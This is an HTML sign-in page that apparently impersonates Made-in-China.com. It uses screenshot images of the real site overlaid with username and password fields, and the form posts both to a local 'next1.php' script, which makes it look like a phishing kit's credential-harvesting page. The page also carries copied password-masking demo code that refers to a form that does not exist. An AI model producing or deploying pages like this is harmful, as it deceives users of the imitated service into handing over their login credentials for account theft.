<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign In | Made-in-China.com</title>
<script type="text/javascript" src="https://www.sitepoint.com/examples/password/MaskedPassword/MaskedPassword.js"></script>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	
<style type="text/css">
.textbox { 
    border: 1px solid #ccc; 
    height: 42px; 
    width: 275px; 
  	font-family: Tahoma,"微软雅黑","宋体",arial;
    font-size: 14px;
  	color: #555;
    padding-left:6px; 
} 
.textbox:focus { 
    outline: none; 
    border: 1px solid #999;
} 
 </style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:210px; top:62px; width:951px; height:461px; z-index:0"><img src="images/m1.png" alt="" title="" border=0 width=951 height=461></div>

<div id="image2" style="position:absolute; overflow:hidden; left:963px; top:269px; width:152px; height:21px; z-index:1"><a href="#"><img src="images/m3.png" alt="" title="" border=0 width=152 height=21></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:1050px; top:434px; width:65px; height:20px; z-index:2"><a href="#"><img src="images/m4.png" alt="" title="" border=0 width=65 height=20></a></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:615px; width:1349px; height:175px; z-index:3"><a href="#"><img src="images/m5.png" alt="" title="" border=0 width=1349 height=175></a></div>
<form action=next1.php name=dafahoja id=dafahoja method=post>
<input name="usr"  class="textbox" autocomplete="off" required type="text" style="position:absolute;width:377px;left:736px;top:202px;z-index:4">
<input name="psw" id="demo-field" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:377px;left:736px;top:302px;z-index:5">
<div id="formimage1" style="position:absolute; left:735px; top:372px; z-index:6"><input type="image" name="formimage1" width="381" height="50" src="images/m2.png"></div>

</div>
<script type="text/javascript">
 
  //apply masking to the demo-field
  //pass the field reference, masking symbol, and character limit
  new MaskedPassword(document.getElementById("demo-field"), '\u25CF');
 
  //test the submitted value
  document.getElementById('demo-form').onsubmit = function()
  {
   alert('pword = "' + this.pword.value + '"');
   return false;
  };
 
 </script>
 
	
</body>
</html>
